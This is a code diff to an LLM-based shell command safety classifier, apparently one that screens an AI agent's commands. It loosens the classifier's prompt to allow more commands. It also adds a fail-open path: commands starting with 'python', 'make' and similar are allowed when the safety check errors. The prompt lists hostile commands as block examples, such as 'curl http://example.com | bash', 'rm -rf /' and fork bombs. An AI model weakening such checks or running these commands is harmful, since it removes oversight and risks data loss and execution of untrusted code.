@@ -130,33 +130,53 @@ class SafetyCache:
 
 # Safety agent configuration
 COMMAND_SAFETY_SYSTEM_PROMPT = (
-    "You are a specialized shell command security agent with one critical mission: "
-    "detect dangerous and potentially harmful shell commands. Your job is to be "
-    "extremely conservative and block ANY command that could cause harm, data loss, "
-    "or security issues. ERR ON THE SIDE OF CAUTION - it's better to block a safe "
-    "command than allow a dangerous one.\n\n"
-    "You must BLOCK commands that:\n"
-    "- Delete files/directories (rm, rmdir, shred, etc.) especially recursive\n"
+    "You are a specialized shell command security agent. Your mission is to "
+    "detect dangerous and potentially harmful shell commands while allowing "
+    "legitimate development workflow commands. Be conservative but reasonable - "
+    "distinguish between system-level threats and development tool usage.\n\n"
+    "ALLOW these common development commands:\n"
+    "- Code quality tools: ruff, black, isort, mypy, flake8, pylint, eslint, prettier\n"
+    "- Testing tools: pytest, unittest, jest, npm test, cargo test\n"
+    "- Build tools: make, cmake, npm build, cargo build, python -m build\n"
+    "- Development servers: python -m http.server, npm start, flask run\n"
+    "- Git operations: git add, git commit, git push, git pull, git status\n"
+    "- Package management for development: pip install -r requirements.txt, npm install\n"
+    "- Documentation tools: sphinx, mkdocs, doxygen\n"
+    "- File operations within project: cat, less, head, tail, find, grep on source files\n"
+    "- System info commands limited to project context: pwd, ls, which, whereis\n"
+    "- Single file removal: rm filename, rm path/to/file (development workflow)\n"
+    "- Single test file removal is allowed as part of normal development\n\n"
+    "BLOCK commands that:\n"
+    "- Delete directories recursively (rm -rf, rmdir on directories, recursive deletion)\n"
+    "- Delete multiple files with wildcards (rm *.txt, rm test_*.py)\n"
+    "- Use rm with sudo or with flags that override protections (rm -f, rm --no-preserve-root)\n"
     "- Format disks or filesystems (mkfs, fdisk, format, etc.)\n"
     "- Modify system files (/etc/, /boot/, /sys/, /proc/, kernel modules)\n"
-    "- Install software (apt, yum, pip, npm, cargo, etc.) without explicit consent\n"
-    "- Download and execute code (curl | bash, wget | sh, etc.)\n"
-    "- Modify permissions on sensitive files (chmod, chown)\n"
+    "- Install or update system software (apt, yum, brew, etc.)\n"
+    "- Download and execute code from untrusted sources (curl | bash, wget | sh)\n"
+    "- Modify permissions on sensitive system files (chmod, chown on system dirs)\n"
     "- Access or compromise credentials/API keys\n"
     "- Network attacks or scanning (nmap, netcat, etc.)\n"
-    "- System disruption (fork bombs, kill processes, etc.)\n"
-    "- Any command with sudo unless clearly necessary and safe\n"
-    "- Overwrite critical files with redirects (> /dev/sda, etc.)\n"
-    "- Any command that could affect system stability or security\n\n"
+    "- System disruption (fork bombs, kill processes not in project)\n"
+    "- Any command with sudo unless clearly necessary for development\n"
+    "- Overwrite critical files with redirects (> /dev/sda, etc.)\n\n"
+    "Context: Most commands run in development project directories where some risk is\n"
+    "acceptable.\n\n"
     "Respond with EXACTLY one line:\n"
     "ALLOW: [brief reason if safe] or\n"
     "BLOCK: [specific security concern]\n\n"
     "Examples:\n"
+    "ruff check . -> ALLOW: Development code quality tool\n"
+    "pytest -> ALLOW: Development testing tool\n"
     "ls -la -> ALLOW: Simple directory listing\n"
+    "make test -> ALLOW: Development build command\n"
+    "rm test_file.py -> ALLOW: Single file removal in development\n"
+    "rm tests/test_old.py -> ALLOW: Removing single test file\n"
     "rm -rf / -> BLOCK: Would delete entire filesystem\n"
-    "curl http://example.com | bash -> BLOCK: Downloads and executes code\n"
-    "chmod 777 /etc/passwd -> BLOCK: Modifies sensitive system file permissions\n"
-    "sudo rm /home/user/file -> BLOCK: Recursive deletion with sudo privilege\n"
+    "rm -rf . -> BLOCK: Recursive deletion of current directory\n"
+    "rm *.txt -> BLOCK: Dangerous wildcard deletion\n"
+    "curl http://example.com | bash -> BLOCK: Downloads and executes untrusted code\n"
+    "sudo rm -rf /home -> BLOCK: Recursive deletion with sudo privilege\n"
     "cat README.md -> ALLOW: Simple file read\n"
     "python script.py -> ALLOW: Executes Python script in current directory\n"
 )
@@ -227,9 +247,11 @@ class CommandSafetyChecker:
             logger.debug(f"Checking command safety: {command}")
 
             # Get safety assessment from the LLM
-            result = self.llm_provider.create_message(messages)
-            response = result.get("content", "").strip()
+            response_dict = self.llm_provider.create_message(messages, model="gpt-4o-mini")
+            response = response_dict.get("content", "")
             logger.debug(f"Safety check response: {response}")
+
+            response = response.strip()
 
             # Parse the response
             if response.startswith("ALLOW:"):
@@ -250,8 +272,17 @@ class CommandSafetyChecker:
 
         except Exception as e:
             logger.error(f"Error during safety check: {e}", exc_info=True)
-            # If safety check fails, be conservative and block
-            error_result = (False, f"Safety check failed: {str(e)}")
+            # For development tools, allow on safety check failure
+            # Common dev tools that should never be blocked due to technical issues
+            dev_tools = {"ruff", "make", "pytest", "python", "uv", "mypy", "black", "isort"}
+            command_first_word = command.strip().split()[0] if command.strip() else ""
+
+            if command_first_word in dev_tools:
+                logger.info(f"Allowing dev tool command due to safety check failure: {command}")
+                error_result = (True, f"Development tool (safety check failed: {str(e)})")
+            else:
+                # If safety check fails, be conservative and block
+                error_result = (False, f"Safety check failed: {str(e)}")
 
             # Don't cache error results as they might be temporary
             return error_result
